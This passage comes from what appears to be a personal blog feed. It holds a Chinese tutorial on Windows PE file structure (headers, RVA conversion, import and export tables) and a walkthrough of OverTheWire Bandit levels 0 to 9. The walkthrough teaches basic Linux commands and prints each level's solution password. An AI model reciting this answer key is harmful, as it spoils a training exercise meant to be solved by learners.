OR形式进行组合</li></ul></li><li>可选头，结构体为IMAGE_OPTIONAL_HEADER32，重要成员有9个：<ul><li>Magic：IMAGE_OPTIONAL_HEADER32为10B，IMAGE_OPTIONAL_HEADER64为20B</li><li><strong>AddressOfEntryPoint</strong>：持有EP的RVA值，指出程序最先执行的代码起始地址</li><li>ImageBase：指出文件的优先装入地址（32位进程虚拟内存范围为：0～7FFFFFFF）</li><li>SectionAlignment,FileAlignment：前者制定了节区在内存中的最小单位，后者制定了节区在磁盘文件中的最小单位</li><li>SizeOfImage：指定了PE Image在虚拟内存中所占空间的大小</li><li>SizeOfHeaders：指出整个PE头的大小</li><li>Subsystem：区分系统驱动文件和普通可执行文件</li><li>NumberOfRvaAndSize：指定DataDirectory数组的个数</li><li><strong>DataDirectory</strong>：<strong>由IMAGE_DATA_DIRECTORY结构体组成的数组</strong></li></ul></li></ul></li><li><p><strong>节区头</strong></p><p>节区头定义了各节区的属性。PE文件中code、data、resource等按照属性储存在不同的节区。好处是可以保证程序的安全性，将代码和数据分隔开，每个节区设计不同的访问权限。</p><p>| 类别     | 访问权限权限     |<br>| ———— | ———————— |<br>| code     | 执行、读取权限   |<br>| data     | 非执行、读写权限 |<br>| resource | 非执行、读取权限 |</p><p>节区头中定义了各节区的属性，包括不同的特性、访问权限等，结构体为IMAGE_SECTION_HEADER，重要成员有5个：</p><ul><li>VirtualSize：内存中节区所占大小</li><li>VirtualAddress：内存中节区起始地址（RVA）</li><li>SizeOfRawData：磁盘文件中节区所占大小</li><li>Charateristics：节区属性（bit OR）</li></ul></li></ol><h2 id="内存映射-RVA-to-RAW"><a href="#内存映射-RVA-to-RAW" class="headerlink" title="内存映射(RVA_to_RAW)"></a><strong>内存映射(RVA_to_RAW)</strong></h2><p>左边文件中使用偏移（offset），内存中使用VA（Virtual Address，虚拟地址）来表示位置。文件加载到内存时，情况就会发生变化（节区大小、位置等）。文件的内容一般可分为代码（.text）、数据（.data）、资源（.rsrc）节，分别保存。PE头与各节区的尾部存在一个区域，成为NULL填充。文件/内存中节区的起始位置应该在各文件/内存最小单位的倍数上，空白区域使用NULL进行填充（如下图所示）。</p><p><img src="https://i.loli.net/2021/04/22/tuVd4UL9BONoP2K.png" alt="102.jpg"></p><p>VA: Virtual Address 进程虚拟内存绝对地址</p><p>RVA: Relative Virtual Address 相对虚拟地址，指从某个基准位置开始的相对地址</p><p>ImageBase: PE文件的优先装载地址</p><p>转换关系如下：</p><script type="math/tex; mode=display">RVA+ImageBase=VA</script><p><strong>Why use VA and RVA?</strong></p><p>PE头内部信息大多以RVA形式存在。PE文件（主要是DLL）加载到进程虚拟内存的特定位置时，该位置可能已经加载了其他PE文件。此时必须通过重定位将其加载到其他空白位置，若PE头用的是VA，则会造成无法正常访问。因此使用RVA来定位信息，即使发生重定位，只要相对于基准的相对地址没有发生变化，就能正常访问到指定信息不会发生问题。</p><p>Demo:</p><p>If RVA=5000,  File Offset=?</p><p>①首先查找RVA对应所在的节区</p><p>→位于第一个节区(.text)  图中ImageBase(01000000)</p><p>②计算公式</p><p>→</p><script type="math/tex; mode=display">RAW=RVA-VirtualAddress+PointerToRawData\\=5000-1000+400=4400</script><h2 id="2-What’s-IAT"><a href="#2-What’s-IAT" class="headerlink" title="2.What’s IAT"></a><strong>2.What’s IAT</strong></h2><p>IAT: Import Address Table 导入地址表。</p><p>这个表保存了与windows操作系统核心进程、内存、DLL结构等相关的信息。只要了理解了IAT，就掌握了Windows操作系统的根基。IAT是一种表格，用来记录程序正在使用哪些库中的哪些函数。</p><p>先了解一下Windows的DDL</p><p>DLL：Dynamic Linked Library 动态链接库</p><ol><li>不把函数库包含进应用程序中，单独组成DLL文件，在需要使用时再进行调用。</li><li>使用内存映射技术将加载后的DLL代码、资源在多个进程中实现共享。</li><li>在对函数库进行更新时，只更新DLL文件，简单易行</li></ol><p>DLL加载方式有两种：<strong>显式链接（Explicit Linking）</strong> 和 <strong>隐式链接（Implicit Linking）</strong></p><ul><li>显示链接：程序在使用DLL时进行加载，使用完毕后释放内存</li><li>隐式链接：程序在开始时即一同加载DLL，程序终止时再释放占用的内存</li></ul><p>IAT提供的机制与DLL的隐式链接有关</p><p><strong>程序调用系统IAT表的时候具体实现过程：</strong></p><p>假设我们程序中某处要用到MessageBoxA，那么这里会有两种形式，一种是先call到一个地址，这个地址中是一个jmp  [A]，A中存放着数据，数据内容就是我们的MessageBox的入口地址。另一种情况是直接calll到MessageBoxA的入口地址即  [A],[A]是A地址存放的数据，A中存放的数据是MessageBox的入口地址，之所以叫做表也是这个原因，因为程序要调用很多系统dll，如果我们的dll地址发生改变，要对每一处调用修改其调用地址是很麻烦的，如果有这样的表，我们将所有的函数调用的入口地址集中在一个集中的地址中，然后通过解析这个表方便我们进行修改，这样我们只要修改这个表所指的函数入口地址。</p><p>我们在OD中选择call了MessageBox的一行，用view 运行文件的方法查看，可以看到这里并不是函数入口地址，而是一个dword的数，这个十六进制数加上基址假设叫做B，我们跳过去看B，看到B中的数据是一个ASCII码的内容，即字符串MessageBox，也就是说，Windows在运行程序，即在加载前通过内部实现，把我们的字符串MessageBox换为了MessageBox的入口地址，这样我们在call 【A】的时候就是跳转到了MessageBox的入口地址。</p><p>下面引入一个结构体</p><p><strong>IMAGE_IMPORT_DESCRIPTOR</strong></p><p>该结构体位于 IMAGE_OPTIONAL_HEADER 的 IMAGE_DATA_DIRECTORY 中定位到第二个目录，即 IMAGE_DIRECTORY_ENTRY_IMPORT。该结构体保存了导入函数的 RVA 地址，通过该 RVA 地址可以定位到导入表的具体位置。</p><p>每一个导入的 DLL 都有一个对应的 IMAGE_IMPORT_DESCRIPTOR，并且以数组的形式存放在文件中的,定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line"></span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"></span><br><span class="line">          DWORD Characteristics;         </span><br><span class="line"></span><br><span class="line">          DWORD OriginalFirstThunk;<span class="comment">//该字段指向导入名称表（INT），该RVA是一个IMAGE_THUNK_DATA结构体</span></span><br><span class="line"></span><br><span class="line">     &#125;;</span><br><span class="line"></span><br><span class="line">      DWORD TimeDateStamp;<span class="comment">//可以忽略，一般为0      </span></span><br><span class="line"></span><br><span class="line">      DWORD ForwarderChain;<span class="comment">//一般为0      </span></span><br><span class="line"></span><br><span class="line">      DWORD Name;<span class="comment">//指向DLL的名称的RVA地址            </span></span><br><span class="line"></span><br><span class="line">      DWORD FirstThunk;<span class="comment">//该字段包含导入地址表（IAT）的RVA，IAT是一个IMAGE_THUNK_DATA结构体数组</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>导入信息并不包含指定导入表的个数，而是以一个全为0的IMAGE_IMPORT_DESCRIPTOR 结构体作为结束标志。</p><p>下面是IMAGE_THUNK_DATA 结构体的定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line"></span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"></span><br><span class="line">           DWORD ForwarderString; <span class="comment">// 一个RVA地址，指向forwarder string </span></span><br><span class="line"></span><br><span class="line">           DWORD Function;        <span class="comment">// PDWORD，被导入的函数的入口地址</span></span><br><span class="line"></span><br><span class="line">           DWORD Ordinal;         <span class="comment">// 该函数的序数</span></span><br><span class="line"></span><br><span class="line">           DWORD AddressOfData;   <span class="comment">// 一个RVA地址，指向IMAGE_IMPORT_BY_NAME</span></span><br><span class="line"></span><br><span class="line">      &#125; u1;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure><p>每一个 IMAGE_THUNK_DATA 对应一个 DLL 中的导入函数。与 IMAGE_IMPORT_DESCRIPTOR 类似，IMAGE_THUNK_DATA 在文件中也是一个数组，并以一个全为 “0” 的 IMAGE_THUNK_DATA 结束。</p><p>当该结构体值的最高位为 0 时，表示函数以函数名字符串的方式导入，这时该 DWORD 的值表示一个 RVA，并指向一个 IMAGE_IMPORT_BY_NAME 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line"></span><br><span class="line">     WORD Hint;         <span class="comment">//该函数的导出序数</span></span><br><span class="line"></span><br><span class="line">     BYTE Name[<span class="number">1</span>];      <span class="comment">// 该函数的名字</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p>看起来可能有些绕，一会IAT一会INT的</p><p>The difference between IAT and INT:</p><p>IMAGE_IMPORT_DESCRIPTOR<code>结构体中的</code>OriginalFirstThunk<code>和</code>FirstThunk<code>都指向</code>IMAGE_THUNK_DATA结构体。</p><p><strong>当文件在磁盘上时，两者指向的是同一个 <code>IMAGE_THUNK_DATA</code>，而当文件载入内存时 <code>OriginalFirstThunk</code> 中保存的仍然是指向函数的 RVA，而 <code>FirstThunk</code> 指向的内存变成了由装载器填充的导入函数地址，即 IAT。</strong></p><p>Look at this pictures:)</p><p><img src="https://i.loli.net/2021/04/23/6YTqlu2GR1S4WbK.png" alt="210.jpg"></p><p>操作系统填充IAT大致流程如下：</p><p> 1.找到导入表起始地址</p><p> 2.找到第一个IID</p><p> 3.根据IID的第四个字段确定dll库名称</p><p> 4.根据IID的第五个字段确定IAT表地址</p><p> 5.通过IAT字符串指针定位到目标函数名称。</p><p> 6.用目标函数地址修改IAT的字符串指针。</p><p> 7.修改下一处IAT</p><p> 8.IAT项为0，修改完毕</p><p> 9.找到下一个IID从第3步开始重复上面的操作。</p><h2 id="What’s-EAT"><a href="#What’s-EAT" class="headerlink" title="What’s EAT"></a><strong>What’s EAT</strong></h2><p>与INT相对应，EAT（Exoprt Adress Table）顾名思义，导出表。</p><p> EAT是一种核心机制，使不同的应用程序可以调用库文件中提供的函数，只有通过EAT才能准确求得从相应库中到处函数的起始地址。PE文件内的IMAGE_EXPORT_DIRECTORY保存着导出信息，<strong>且PE文件中仅有一个用来说明EAT的IMAGE_EXPORT_DIRECTORY结构体。</strong>（这点对比IAT：IAT的 IMAGE_IMPORT_DESCRIPTOR结构体以数组形式存在，且有多个成员，这主要是因为PE文件可以同时导入多个库。</p><p>EAT结构体位于PE头中，IMAGE_OPTIONAL_HEADER32.DataDirectory[0]</p><p>  IMAGE_EXPORT_DIRECTORY结构：</p><p>依旧先放结构体定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">DWORD Characteristics;<span class="comment">//保留 总是定义为0</span></span><br><span class="line">DWORD TimeDateStamp;<span class="comment">//文件生成时间</span></span><br><span class="line">WORD  MajorVersion;<span class="comment">//主版本号 一般不赋值</span></span><br><span class="line">WORD  MinorVersion;<span class="comment">//次版本号 一般不赋值</span></span><br><span class="line">DWORD Name;<span class="comment">//模块的真实名称</span></span><br><span class="line">DWORD Base;<span class="comment">//索引基数 加上序数就是函数地址数组的索引值</span></span><br><span class="line">DWORD NumberOfFunctions;<span class="comment">//地址表中个数</span></span><br><span class="line">DWORD NumberOfNames;<span class="comment">//名称表的个数</span></span><br><span class="line">DWORD AddressOfFunctions;<span class="comment">//输出函数地址的RVA</span></span><br><span class="line">DWORD AddressOfNames;<span class="comment">//输出函数名字的RVA</span></span><br><span class="line">DWORD AddressOfNameOrdinals;<span class="comment">//输出函数序号的RVA</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORYM, *pIMAGE_EXPORT_DIRECTORY; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/23/HaVkY3scUndb7fu.png" alt="EXP.jpg"></p><p>Demo: kernel32.dll</p><p><img src="https://i.loli.net/2021/04/23/jnRY8mx1zyHsTWw.png" alt="209.jpg"></p><p>从库中获得函数地址的API为GetProcAddress()函数，该API引用EAT来获取指定API的地址。其过程大致如下：</p><ol><li>利用AddressOfName成员转到“函数名称数组”</li><li>“函数名称数组”中存储着字符串地址，通过比较（strcmp）字符串，查找指定的函数名称（此时数组的索引称为name_index）</li><li>利用AddressOfNameOrdinals成员，转到ordinal数组</li><li>在ordinal数组中通过name_index查找相应ordinal值</li><li>利用AddressOfFunctionis成员转到“函数地址数组”（EAT）</li><li>在“函数地址数组”中将刚刚求得的ordinal用作数组索引，获得指定函数的起始地址</li></ol><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><p>PE文件是逆向的一个基础，了解PE文件的结构和动态连接的过程有利于我们更好地理解高级调试。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Windows-PE文件格式&quot;&gt;&lt;a href=&quot;#Windows-PE文件格式&quot; class=&quot;headerlink&quot; title=&quot;Windows_PE文件格式&quot;&gt;&lt;/a&gt;Windows_PE文件格式&lt;/h1&gt;&lt;p&gt;​    PE文件格式是理解Windows操</summary>
      
    
    
    
    <category term="Windows" scheme="http://example.com/categories/Windows/"/>
    
    
    <category term="windows" scheme="http://example.com/tags/windows/"/>
    
    <category term="PE文件" scheme="http://example.com/tags/PE%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>linux_base题解</title>
    <link href="http://example.com/2021/04/21/linux_Base/"/>
    <id>http://example.com/2021/04/21/linux_Base/</id>
    <published>2021-04-21T10:04:58.210Z</published>
    <updated>2021-04-21T09:55:54.615Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux-base题解"><a href="#linux-base题解" class="headerlink" title="linux_base题解"></a>linux_base题解</h1><p>重新系统地过一遍，主要是一些Linux的基本命令和基础知识。</p><h2 id="Level-0"><a href="#Level-0" class="headerlink" title="Level_0"></a>Level_0</h2><h2 id="What-is-SSH"><a href="#What-is-SSH" class="headerlink" title="What is SSH ?"></a><strong>What is SSH ?</strong></h2><p>According to SearchSecurity, SSH is a network protocol that gives users, particularly system administrators, a secure way to <strong>access a computer</strong> over an <strong>unsecured network</strong>.</p><ul><li>Host Name : <code>bandit.labs.overthewire.org</code></li><li>Username : <code>bandit0</code></li><li>Password : <code>bandit0</code></li><li>Port Number : <code>2220</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh bandit0@bandit.labs.overthewire.org -p 2220</span><br></pre></td></tr></table></figure><h2 id="Level-0➡Level-1"><a href="#Level-0➡Level-1" class="headerlink" title="Level_0➡Level_1"></a>Level_0➡Level_1</h2><h2 id="Usage-of-ls-and-cat"><a href="#Usage-of-ls-and-cat" class="headerlink" title="Usage of ls and cat:"></a><strong>Usage of ls and cat:</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit0@bandit:~$ ls</span><br><span class="line">readme</span><br><span class="line">bandit0@bandit:~$ cat readme </span><br><span class="line">boJ9jbbUNNfktd78OOpsqOltutMc3MY1</span><br></pre></td></tr></table></figure><h2 id="Level-1➡Level-2"><a href="#Level-1➡Level-2" class="headerlink" title="Level_1➡Level_2"></a>Level_1➡Level_2</h2><h2 id="cat-the-file-stars-with-dash"><a href="#cat-the-file-stars-with-dash" class="headerlink" title="cat the file stars with dash:"></a><strong>cat the file stars with dash:</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit1@bandit:~$ cat ./-</span><br><span class="line">CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</span><br><span class="line">bandit1@bandit:~$ cat &lt;-</span><br><span class="line">CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</span><br></pre></td></tr></table></figure><h2 id="Level-2➡Level-3"><a href="#Level-2➡Level-3" class="headerlink" title="Level_2➡Level_3"></a>Level_2➡Level_3</h2><h2 id="Use”-“-to-escape-character"><a href="#Use”-“-to-escape-character" class="headerlink" title="Use” \“  to escape character"></a><strong>Use” \“  to escape character</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit2@bandit:~$ ls</span><br><span class="line">spaces <span class="keyword">in</span> this filename</span><br><span class="line">bandit2@bandit:~$ cat spaces\ <span class="keyword">in</span>\ this\ filename </span><br><span class="line">UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</span><br></pre></td></tr></table></figure><h2 id="Level-3➡Level-4"><a href="#Level-3➡Level-4" class="headerlink" title="Level_3➡Level_4"></a>Level_3➡Level_4</h2><h2 id="Usage-of-command-ls-、cd"><a href="#Usage-of-command-ls-、cd" class="headerlink" title="Usage of command : ls 、cd:"></a><strong>Usage of command : ls</strong> 、<strong>cd</strong>:</h2><p>The <strong>ls</strong> command is used to view the contents of a directory. By default, this command will display the contents of your current working directory.</p><p>If you want to see the content of other directories, type <strong>ls</strong> and then the directory’s path. For example, enter <strong>ls</strong> <strong>/home/username/Documents</strong> to view the content of <strong>Documents</strong>.</p><p>There are variations you can use with the <strong>ls</strong> command:</p><ul><li><strong>ls -R</strong> will list all the files in the sub-directories as well</li><li><strong>ls -a</strong> will show the hidden files</li><li><strong>ls -al</strong> will list the files and directories with detailed information like the permissions, size, owner, etc.</li></ul><p>Hidden file: start with    <strong>.</strong>    is hidden file</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bandit3@bandit:~$ ls</span><br><span class="line">inhere</span><br><span class="line">bandit3@bandit:~$ <span class="built_in">cd</span> inhere/</span><br><span class="line">bandit3@bandit:~/inhere$ ls</span><br><span class="line">bandit3@bandit:~/inhere$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 root    root    4096 May  7  2020 .</span><br><span class="line">drwxr-xr-x 3 root    root    4096 May  7  2020 ..</span><br><span class="line">-rw-r----- 1 bandit4 bandit3   33 May  7  2020 .hidden</span><br><span class="line">bandit3@bandit:~/inhere$ cat .hidden </span><br><span class="line">pIwrPrtPN36QITSp3EQaw936yaFoFgAB</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Level-4➡Level-5"><a href="#Level-4➡Level-5" class="headerlink" title="Level_4➡Level_5"></a>Level_4➡Level_5</h2><h2 id="Usage-of-command-file"><a href="#Usage-of-command-file" class="headerlink" title="Usage of command : file"></a><strong>Usage of command : file</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file [-bcLvz][-f &lt;名称文件&gt;][-m &lt;魔法数字文件&gt;...][文件或目录...]</span><br></pre></td></tr></table></figure><ul><li><p>-b 　列出辨识结果时，不显示文件名称。</p></li><li><p>-c 　详细显示指令执行过程，便于排错或分析程序执行的情形。</p></li><li><p>-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。</p></li><li><p>-L 　直接显示符号连接所指向的文件的类别。</p></li><li><p>-m&lt;魔法数字文件&gt; 　指定魔法数字文件。</p></li><li><p>-v 　显示版本信息。</p></li><li><p>-z 　尝试去解读压缩文件的内容。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bandit4@bandit:~$ ls</span><br><span class="line">inhere</span><br><span class="line">bandit4@bandit:~$ <span class="built_in">cd</span> inhere/</span><br><span class="line">bandit4@bandit:~/inhere$ ls</span><br><span class="line">-file00  -file02  -file04  -file06  -file08</span><br><span class="line">-file01  -file03  -file05  -file07  -file09</span><br><span class="line">bandit4@bandit:~/inhere$ file ./*</span><br><span class="line">./-file00: data</span><br><span class="line">./-file01: data</span><br><span class="line">./-file02: data</span><br><span class="line">./-file03: data</span><br><span class="line">./-file04: data</span><br><span class="line">./-file05: data</span><br><span class="line">./-file06: data</span><br><span class="line">./-file07: ASCII text</span><br><span class="line">./-file08: data</span><br><span class="line">./-file09: data</span><br><span class="line">bandit4@bandit:~/inhere$ cat ./-file07</span><br><span class="line">koReBOKuIDDepwhWk7jZC0RTdopnAYKh</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Level-5➡Level-6"><a href="#Level-5➡Level-6" class="headerlink" title="Level_5➡Level_6"></a>Level_5➡Level_6</h2><h2 id="Usage-of-file"><a href="#Usage-of-file" class="headerlink" title="Usage of file:"></a><strong>Usage of file:</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bandit5@bandit:~/inhere$ ls</span><br><span class="line">maybehere00  maybehere04  maybehere08  maybehere12  maybehere16</span><br><span class="line">maybehere01  maybehere05  maybehere09  maybehere13  maybehere17</span><br><span class="line">maybehere02  maybehere06  maybehere10  maybehere14  maybehere18</span><br><span class="line">maybehere03  maybehere07  maybehere11  maybehere15  maybehere19</span><br><span class="line">bandit5@bandit:~/inhere$ find ./ -<span class="built_in">type</span> f -size 1033c</span><br><span class="line">./maybehere07/.file2</span><br><span class="line">bandit5@bandit:~/inhere$ cat ./maybehere07/.file2</span><br><span class="line">DXjZPULLxYr17uwoI01bNLQbtFemEgo7</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Level-6➡Level-7"><a href="#Level-6➡Level-7" class="headerlink" title="Level_6➡Level_7"></a>Level_6➡Level_7</h2><h2 id="Learn-about-redirection"><a href="#Learn-about-redirection" class="headerlink" title="Learn about redirection:"></a><strong>Learn about redirection:</strong></h2><p><strong>Analyse</strong>:</p><p>The password for the next level is stored somewhere on the server and has all of the following properties:</p><p><em>owned by user bandit7</em></p><p><em>owned by group bandit6</em></p><p><em>33 bytes in size</em></p><p><strong>So this is exp:</strong></p><p><em>find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null</em></p><p><em>/ from root folder</em></p><p><em>-user the owner of the file.</em></p><p><em>-group the group owner of the file.</em></p><p><em>-size the size of the file.</em></p><p><em>2&gt;/dev/null redirects error messages to null so that they do not show on stdout.</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null</span><br><span class="line">/var/lib/dpkg/info/bandit7.password</span><br><span class="line">bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password </span><br><span class="line">HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</span><br></pre></td></tr></table></figure><h2 id="Level-7➡Level-8"><a href="#Level-7➡Level-8" class="headerlink" title="Level_7➡Level_8"></a>Level_7➡Level_8</h2><h2 id="Learn-about-the-pipe-and-usage-if-grep"><a href="#Learn-about-the-pipe-and-usage-if-grep" class="headerlink" title="Learn about the pipe and usage if grep:"></a><strong>Learn about the pipe and usage if grep:</strong></h2><h3 id="grep-command"><a href="#grep-command" class="headerlink" title="grep command"></a>grep command</h3><p>It lets you search through all the text in a given file.</p><p>To illustrate, <strong>grep blue notepad.txt</strong> will search for the word blue in the notepad file. Lines that contain the searched word will be displayed fully.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-i 忽略大小写</span><br><span class="line">-E 启用POSIX扩展正则表达式</span><br><span class="line">-P 启用perl正则</span><br><span class="line">-o 只输出正则表达式匹配的内容</span><br><span class="line">-w 整字匹配</span><br><span class="line">-v 不匹配的</span><br><span class="line">-n 输出行号</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit7@bandit:~$ cat data.txt |grep millionth</span><br><span class="line">millionthcvX2JJa4CFALtqS87jk27qwqGhBM9plV</span><br></pre></td></tr></table></figure><h2 id="Level-8➡Level-9"><a href="#Level-8➡Level-9" class="headerlink" title="Level_8➡Level_9"></a>Level_8➡Level_9</h2><h2 id="Learn-about-the-sort-and-uniq"><a href="#Learn-about-the-sort-and-uniq" class="headerlink" title="Learn about the sort and uniq:"></a><strong>Learn about the sort and uniq:</strong></h2><p><strong>sort:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort [-bcdfimMnr][-o&lt;输出文件&gt;][-t&lt;分隔字符&gt;][+&lt;起始栏位&gt;-&lt;结束栏位&gt;][--<span class="built_in">help</span>][--verison][文件]</span><br></pre></td></tr></table></figure><ul><li>-u  在输出行中去除重复行。</li><li>-r  sort默认的排序方式是升序，如果想改成降序，就加个-r即可。</li><li>-n  sort要以数值来排序</li><li>-t  指定分割符</li><li>-k  指定第几列排序</li></ul><p><strong>uniq:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uniq [-cdu][-f&lt;栏位&gt;][-s&lt;字符位置&gt;][-w&lt;字符位置&gt;][--<span class="built_in">help</span>][--version][输入文件][输出文件]</span><br></pre></td></tr></table></figure><p> -c, —count                  在每行前显示该行重复次数<br> -d, —repeated            只输出重复的行<br> -D, —all-repeated      只输出重复的行，不过有几行输出几行<br> -f, —skip-fields=N     -f 忽略的段数，-f 1 忽略第一段<br> -i, —ignore-case         不区分大小写<br> -s, —skip-chars=N     与-f有点像，不过-s是忽略，后面多少个字符 -s 5就忽略后面5个字符<br> -u, —unique               去除重复的后，全部显示出来，根mysql的distinct功能上有点像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit8@bandit:~$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit8@bandit:~$ sort data.txt | uniq -u</span><br><span class="line">UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</span><br></pre></td></tr></table></figure><h2 id="Level-9➡Level-10"><a href="#Level-9➡Level-10" class="headerlink" title="Level_9➡Level_10"></a>Level_9➡Level_10</h2><h2 id="Usage-of-grep"><a href="#Usage-of-grep" class="headerlink" title="Usage of grep:"></a><strong>Usage of grep:</strong></h2><p>strings : export strings in  binary file </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bandit9@bandit:~$ ls</span><br><span 